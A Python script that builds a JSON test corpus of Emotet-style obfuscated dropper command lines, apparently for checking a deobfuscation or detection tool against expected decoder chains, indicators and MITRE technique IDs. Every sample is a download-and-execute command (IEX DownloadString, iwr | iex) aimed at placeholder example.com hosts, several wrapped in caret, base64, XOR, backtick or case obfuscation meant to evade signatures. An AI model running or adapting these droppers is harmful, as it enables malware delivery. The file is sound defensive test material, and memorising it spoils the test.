"""
Phase R1 \u00b7 Emotet family sample builder (technique-first schema).

Emotet (aka Geodo / Heodo, TA542) is the archetypal downloader turned
loader-as-a-service. Delivered via malspam attachments (Excel-4
macros, Word DOCM, OneNote), Emotet drops via a `cmd.exe /c
powershell -enc <b64>` chain that stages the actual Emotet payload
from a rotating C2. Emotet 2022+ reappearance uses XOR byte-array
config decoders for its C2 URL list.

This pack covers the CMD + PowerShell + XOR sides observed in
public IR reports (Cryptolaemus, Malpedia, Trend Micro, Fortinet,
Microsoft Threat Intelligence Emotet 2023-2024 writeups).
"""
from __future__ import annotations

import base64
import json
from pathlib import Path

FAMILIES_DIR = Path(__file__).resolve().parent / "families"
TARGET = FAMILIES_DIR / "emotet.json"


def _b64_utf16le(s: str) -> str:
    return base64.b64encode(s.encode("utf-16le")).decode("ascii")


def _sample(sid, variant, input_str, interpreter, final_interpreter,
            decoder_chain, final_output_contains, iocs_contains,
            mitre_attack, behaviors):
    return {
        "id": sid,
        "variant": variant,
        "input": input_str,
        "expected": {
            "interpreter": interpreter,
            "final_interpreter": final_interpreter,
            "decoder_chain": decoder_chain,
            "final_output_contains": final_output_contains,
            "iocs_contains": iocs_contains,
            "mitre_attack": mitre_attack,
            "behaviors": behaviors,
        },
    }


TECHNIQUES: list[dict] = [
    {
        "id": "cmd_caret_powershell_handoff",
        "display_name": "Emotet CMD Caret \u2192 PS -Enc Handoff",
        "description": (
            "Classic Emotet dropper chain: Word/Excel macro spawns "
            "`c^m^d /c p^ow^ers^he^ll -e^n^c <b64>` to stage the "
            "Emotet payload. Observed in every public Emotet sample "
            "since 2020."
        ),
        "mitre_attack": ["T1059.001", "T1059.003", "T1027", "T1140", "T1105"],
        "samples": [
            _sample(
                "EM001", "cmd_caret_ps_enc_classic_dropper",
                "c^m^d /c p^ow^ers^he^ll -e^n^c " + _b64_utf16le(
                    "IEX ((New-Object Net.WebClient).DownloadString('http://emotet-c2.example.com/payload.exe'))"
                ),
                "cmd", "powershell",
                ["cmd-caret-strip", "powershell-encoded-command", "base64", "utf-16le-decode", "alias-expand"],
                ["Invoke-Expression", "http://emotet-c2.example.com/payload.exe"],
                ["http://emotet-c2.example.com/payload.exe"],
                ["T1059.001", "T1059.003", "T1105", "T1027", "T1140"],
                ["cmd_to_ps_handoff", "download_and_execute", "obfuscated_command_line"],
            ),
            _sample(
                "EM002", "cmd_caret_ps_enc_nested_c2",
                "c^m^d.e^xe /c p^ow^ers^he^ll -e^nc " + _b64_utf16le(
                    "IEX ((New-Object Net.WebClient).DownloadString('http://em-drop.example.net/e_v3.ps1'))"
                ),
                "cmd", "powershell",
                ["cmd-caret-strip", "powershell-encoded-command", "base64", "utf-16le-decode", "alias-expand"],
                ["Invoke-Expression", "http://em-drop.example.net/e_v3.ps1"],
                ["http://em-drop.example.net/e_v3.ps1"],
                ["T1059.001", "T1059.003", "T1105", "T1027", "T1140"],
                ["cmd_to_ps_handoff", "download_and_execute", "obfuscated_command_line"],
            ),
        ],
    },
    {
        "id": "powershell_encodedcommand_dropper",
        "display_name": "PowerShell -EncodedCommand Dropper",
        "description": (
            "Raw `powershell -EncodedCommand <b64>` invocation "
            "without CMD-caret wrapper. Observed in Excel-4 macro "
            "variants that skip the cmd shim."
        ),
        "mitre_attack": ["T1059.001", "T1027", "T1140", "T1105"],
        "samples": [
            _sample(
                "EM003", "encodedcommand_direct_dropper",
                "powershell -EncodedCommand " + _b64_utf16le(
                    "IEX ((New-Object Net.WebClient).DownloadString('http://em-direct.example.com/e.exe'))"
                ),
                "powershell", "powershell",
                ["powershell-encoded-command", "base64", "utf-16le-decode", "alias-expand"],
                ["Invoke-Expression", "http://em-direct.example.com/e.exe"],
                ["http://em-direct.example.com/e.exe"],
                ["T1059.001", "T1105", "T1027", "T1140"],
                ["download_and_execute", "obfuscated_command_line"],
            ),
            _sample(
                "EM004", "encodedcommand_hidden_window",
                "powershell -NoP -W Hidden -Enc " + _b64_utf16le(
                    "IEX ((New-Object Net.WebClient).DownloadString('http://em-hidden.example.com/e.exe'))"
                ),
                "powershell", "powershell",
                ["powershell-encoded-command", "base64", "utf-16le-decode", "alias-expand"],
                ["Invoke-Expression", "http://em-hidden.example.com/e.exe"],
                ["http://em-hidden.example.com/e.exe"],
                ["T1059.001", "T1105", "T1027", "T1564.003"],
                ["download_and_execute", "hidden_window", "obfuscated_command_line"],
            ),
        ],
    },
    {
        "id": "xor_c2_config_decoder",
        "display_name": "Emotet XOR C2-List Config Decoder",
        "description": (
            "Emotet 2022+ reappearance decodes its rotating C2 URL "
            "list from a byte-array XOR blob at startup. Signature "
            "Emotet technique documented by Cryptolaemus & Fortinet."
        ),
        "mitre_attack": ["T1027", "T1140"],
        "samples": [
            _sample(
                "EM005", "xor_c2_url_list_reveal",
                ",".join(f"0x{b ^ 0x77:02x}" for b in b"http://emotet-xor1.example.com/gate|http://emotet-xor2.example.net/get|http://emotet-xor3.example.org/beacon")
                + " xor 0x77",
                None, "generic",
                ["xor-byte-array"],
                [
                    "http://emotet-xor1.example.com/gate",
                    "http://emotet-xor2.example.net/get",
                    "http://emotet-xor3.example.org/beacon",
                ],
                [
                    "http://emotet-xor1.example.com/gate",
                    "http://emotet-xor2.example.net/get",
                ],
                ["T1027", "T1140", "T1071.001"],
                ["byte_array_xor_decode", "c2_url_reveal"],
            ),
        ],
    },
    {
        "id": "powershell_string_concat_url",
        "display_name": "Emotet PowerShell URL String-Concat",
        "description": (
            "Emotet's obfuscation profile splits the payload URL "
            "across multiple SQ concat fragments to defeat static "
            "URL extractors."
        ),
        "mitre_attack": ["T1059.001", "T1105", "T1027.010"],
        "samples": [
            _sample(
                "EM006", "three_var_url_concat",
                "$a='ht'; $b='tp://em-concat.example.com'; $c='/payload.exe'; iex ((new-object net.webclient).downloadstring($a+$b+$c))",
                "powershell", "powershell",
                ["variable-propagate", "string-concat-fold", "alias-expand"],
                ["Invoke-Expression", "http://em-concat.example.com/payload.exe"],
                ["http://em-concat.example.com/payload.exe"],
                ["T1059.001", "T1105", "T1027.010"],
                ["download_and_execute", "obfuscated_command_line"],
            ),
        ],
    },
    {
        "id": "powershell_random_case_obf",
        "display_name": "Emotet Random-Case Cmdlet Obfuscation",
        "description": (
            "Emotet's PowerShell templates randomize cmdlet casing to "
            "evade string-match signatures."
        ),
        "mitre_attack": ["T1059.001", "T1027.010"],
        "samples": [
            _sample(
                "EM007", "random_case_iex_ds",
                "iEx ((nEw-oBjeCt nEt.WebClIent).DoWnLoaDString('http://em-case.example.com/em_c.exe'))",
                "powershell", "powershell",
                ["alias-expand"],
                ["Invoke-Expression", "http://em-case.example.com/em_c.exe"],
                ["http://em-case.example.com/em_c.exe"],
                ["T1059.001", "T1105", "T1027.010"],
                ["case_obfuscation", "download_and_execute"],
            ),
        ],
    },
    {
        "id": "powershell_backtick_alias_obf",
        "display_name": "Emotet Backtick Alias Obfuscation",
        "description": (
            "Backticks injected mid-identifier for EDR evasion."
        ),
        "mitre_attack": ["T1059.001", "T1027.010"],
        "samples": [
            _sample(
                "EM008", "backtick_iwr_useb_iex",
                "i`wr 'http://em-bt.example.com/em_bt.ps1' -useb | i`ex",
                "powershell", "powershell",
                ["backtick-strip", "alias-expand"],
                ["Invoke-WebRequest", "http://em-bt.example.com/em_bt.ps1", "Invoke-Expression"],
                ["http://em-bt.example.com/em_bt.ps1"],
                ["T1059.001", "T1105", "T1027.010"],
                ["backtick_obfuscation", "download_and_execute"],
            ),
        ],
    },
    {
        "id": "frombase64string_shellcode_stage",
        "display_name": "[Convert]::FromBase64String Shellcode Stage",
        "description": (
            "Emotet stage-2 unpacks its native loader via "
            "`$sc = [Convert]::FromBase64String('...'); IEX $sc`."
        ),
        "mitre_attack": ["T1059.001", "T1027", "T1140", "T1105"],
        "samples": [
            _sample(
                "EM009", "frombase64string_stage2_shellcode",
                "$sc = [Convert]::FromBase64String('"
                + base64.b64encode(
                    b"IEX ((New-Object Net.WebClient).DownloadString('http://em-stage2.example.com/em_final.ps1'));"
                ).decode("ascii")
                + "'); IEX $sc",
                "powershell", "powershell",
                ["decoder-frombase64string-fold", "alias-expand"],
                ["Invoke-Expression", "http://em-stage2.example.com/em_final.ps1"],
                ["http://em-stage2.example.com/em_final.ps1"],
                ["T1059.001", "T1105", "T1027", "T1140"],
                ["download_and_execute", "shellcode_staging"],
            ),
        ],
    },
    {
        "id": "iex_downloadstring_beacon",
        "display_name": "Emotet IEX DownloadString C2 Beacon",
        "description": (
            "Downstream C2 check-in beacon delivered by the Emotet "
            "PowerShell stage."
        ),
        "mitre_attack": ["T1059.001", "T1105"],
        "samples": [
            _sample(
                "EM010", "iex_downloadstring_beacon_http",
                "IEX ((New-Object Net.WebClient).DownloadString('http://em-beacon.example.com/task'))",
                "powershell", "powershell",
                ["alias-expand"],
                ["Invoke-Expression", "http://em-beacon.example.com/task"],
                ["http://em-beacon.example.com/task"],
                ["T1059.001", "T1105"],
                ["download_and_execute", "c2_beacon"],
            ),
            _sample(
                "EM011", "iwr_useb_iex_beacon_https",
                "iwr https://em-beacon2.example.net/task -useb | iex",
                "powershell", "powershell",
                ["alias-expand"],
                ["Invoke-WebRequest", "https://em-beacon2.example.net/task", "Invoke-Expression"],
                ["https://em-beacon2.example.net/task"],
                ["T1059.001", "T1105"],
                ["download_and_execute", "c2_beacon"],
            ),
        ],
    },
]

# Emotet's Excel-4 macro + native binary + WMIC LOLBAS are not modeled here.
COVERAGE_GAP_TECHNIQUES: list[str] = [
    "excel4_macro_extraction",         # XLS/XLSM macro decoder
    "wmic_process_create_launcher",    # wmic process call create 'cmd /c ...'
    "emotet_native_config_decrypt",    # Native PE config RC4
]


def build() -> dict:
    known_universe = sorted({t["id"] for t in TECHNIQUES} | set(COVERAGE_GAP_TECHNIQUES))
    return {
        "family_id": "emotet",
        "family_display_name": "Emotet",
        "family_version": "r1-2.0.0",
        "schema_version": "technique-first-1.0.0",
        "description": (
            "Emotet (Geodo / Heodo / TA542) archetypal downloader-"
            "turned-LaaS. Delivered via Excel-4 macro / DOCM / "
            "OneNote malspam attachments. This pack covers the CMD + "
            "PowerShell + XOR sides."
        ),
        "primary_mitre_attack": [
            "T1059.001", "T1059.003", "T1027", "T1027.010",
            "T1140", "T1105", "T1071.001", "T1564.003",
        ],
        "primary_behaviors": [
            "cmd_to_ps_handoff",
            "download_and_execute",
            "byte_array_xor_decode",
            "c2_beacon",
            "obfuscated_command_line",
        ],
        "known_technique_universe": known_universe,
        "coverage_gap_techniques": sorted(COVERAGE_GAP_TECHNIQUES),
        "techniques": TECHNIQUES,
    }


def main() -> int:
    FAMILIES_DIR.mkdir(parents=True, exist_ok=True)
    payload = build()
    TARGET.write_text(json.dumps(payload, indent=2) + "\n", encoding="utf-8")
    sample_count = sum(len(t["samples"]) for t in payload["techniques"])
    print(
        f"Wrote {sample_count} Emotet samples across "
        f"{len(payload['techniques'])} techniques "
        f"({len(payload['coverage_gap_techniques'])} declared coverage gaps) "
        f"to {TARGET}"
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
